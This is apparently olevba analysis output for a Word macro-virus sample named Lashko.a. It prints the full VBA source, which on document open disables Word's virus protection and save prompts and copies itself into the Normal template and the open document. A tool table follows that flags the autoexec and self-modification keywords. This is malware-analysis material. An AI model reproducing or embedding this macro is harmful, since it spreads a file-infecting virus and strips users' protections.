olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lashko.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lashko.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Lashko.a - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
With Options
.VirusProtection = G
.ConfirmConversions = G
.SaveNormalPrompt = G
Set G = False
End With
Set gt56 = NormalTemplate.VBProject: kj87 = gt56.VBComponents(1).CodeModule.CountOfLines
Set xc24 = ActiveDocument.VBProject: sd12 = xc24.VBComponents(1).CodeModule.CountOfLines
If kj87 < sd12 Then
lashko_pa = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(1, sd12)
NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, lashko_pa
Else
If sd12 < kj87 Then
lashko_pn = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, kj87)
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, lashko_pn
End If
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

